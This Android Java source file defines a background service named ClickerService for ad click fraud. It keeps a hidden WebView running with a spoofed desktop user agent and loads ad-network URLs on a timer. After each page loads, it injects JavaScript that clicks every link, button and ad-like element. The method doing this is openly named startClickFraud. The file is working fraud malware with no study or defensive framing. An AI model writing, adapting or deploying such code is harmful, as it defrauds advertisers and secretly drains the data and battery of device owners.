package com.earner.pro.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.util.Timer;
import java.util.TimerTask;

public class ClickerService extends Service {
    
    private WebView webView;
    private Timer clickTimer;
    private String[] adUrls = {
        "https://www.google.com/adsense",
        "https://www.facebook.com/ads",
        "https://www.admob.com",
        "https://www.unity.com/ads",
        "https://www.applovin.com",
        "https://www.vungle.com"
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setUserAgentString(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        );
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                // Simulate click after page loads
                simulateClick();
            }
        });
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startClickFraud();
        return START_STICKY;
    }
    
    private void startClickFraud() {
        clickTimer = new Timer();
        clickTimer.schedule(new TimerTask() {
            int index = 0;
            
            @Override
            public void run() {
                // Load ad URL in hidden webview
                String url = adUrls[index % adUrls.length];
                webView.loadUrl(url);
                index++;
            }
        }, 5000, 30000); // Every 30 seconds
    }
    
    private void simulateClick() {
        // Inject JavaScript to click on ad elements
        String js = 
            "var elements = document.querySelectorAll('a, button, .ad, .ads, [class*=\"ad\"], [id*=\"ad\"]');" +
            "for(var i=0; i<elements.length; i++) {" +
            "   elements[i].click();" +
            "}" +
            "document.body.click();";
        
        webView.evaluateJavascript(js, null);
    }
    
    @Override
    public void onDestroy() {
        if (clickTimer != null) {
            clickTimer.cancel();
        }
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}